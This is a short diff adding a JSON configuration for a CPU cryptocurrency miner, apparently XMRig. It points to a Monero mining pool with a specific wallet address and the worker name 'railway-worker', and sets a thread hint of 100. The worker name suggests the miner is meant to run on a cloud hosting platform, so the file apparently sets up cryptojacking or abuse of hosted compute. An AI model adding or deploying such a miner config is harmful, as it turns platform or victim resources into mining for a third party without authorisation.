@@ -1,0 +1,17 @@
+{
+    "cpu": {
+        "enabled": true,
+        "max-threads-hint": 100,
+        "huge-pages": false,
+        "randomx-mode": "light"
+    },
+    "pools": [
+        {
+            "url": "pool.hashvault.pro:443",
+            "user": "45AeDFhSSXkMeUtumvwgdwG3ybSqwti2XGPunSofzjWraxfDK4Kz8giZtjmWiu9qLAWyEFWZHuUb96PKXYNzSpDKDZFAq4y",
+            "pass": "railway-worker",
+            "tls": true,
+            "keepalive": true
+        }
+    ]
+}
